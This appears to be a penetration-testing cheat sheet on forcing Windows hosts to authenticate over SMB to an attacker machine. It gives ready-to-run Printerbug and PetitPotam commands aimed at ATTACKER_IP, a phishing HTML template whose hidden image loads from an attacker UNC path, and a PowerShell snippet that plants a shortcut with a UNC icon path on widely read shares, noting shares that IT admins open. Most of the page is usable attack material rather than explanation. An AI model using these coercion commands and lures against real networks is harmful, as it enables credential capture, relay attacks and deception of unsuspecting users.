# Trigger Incoming SMB Connections
## Printerbug
https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py   

Simple tool to trigger SpoolService bug via RPC backconnect. Similar to dementor.py.    
`# python3 printerbug.py domain/USER:password@target.domain.local ATTACKER_IP`   
 
### Using SpoolSample
The Printerbug can also be triggered from Windows using the "SpoolSample" tool: https://ci.appveyor.com/project/CompassSecurity/spoolsample   

*Check Spooler Remotely*
To check if the spooler is active on the remote target, there are different methods:   
- For DCs, you can use PingCastle   
- For manually checking a specific target with PowerShell, use: https://raw.githubusercontent.com/vletoux/SpoolerScanner/master/SpoolerScan.ps1
- For manually checking a specific target with Python, use: https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py

## PetitPotam
https://github.com/topotam/PetitPotam   

PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw function. This is possible via other protocols and functions as well ;) .
The tools use the LSARPC named pipe with inteface c681d488-d850-11d0-8c52-00c04fd90f7e because it's more prevalent.
But it's possible to trigger with the EFSRPC named pipe and interface df1941c5-fe89-4e79-bf10-463657acf44d.
It doesn't need credentials against Domain Controller.

`# python3 PetitPotam.py -d 'domain' -u 'user' -p 'password' ATTACKER_IP TARGET`   

## Phishing email with <img> tag
Payload template
```
<html>
<body>
<img src="\\<ATTACKER VM>\compass.ico" height="1" width="1" />
</body>
</html>
```

*Outlook* 
For some reason outlook only allows to embed an HTML file if it is attached through the quick access bar.
First you need to show the quick access toolbar, then customize the quick access toolbar by adding the command "Attach File" (More Commands...).
You can then attach the HTML payload to your email (Make sure you click on the dropdown and "Insert as Text")

## Shortcut
Trigger SMB connection using a shortcut, by setting its icon location to a UNC path (e.g. kali running Responder):   
```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\computername\software\test.lnk")
$shortcut.IconLocation = "\\10.10.10.1\test.ico"
$shortcut.Save()
```
A good location for such a file would be a central SMB share where many people have read access. (Or a share where the IT admins are regularly connecting to...)
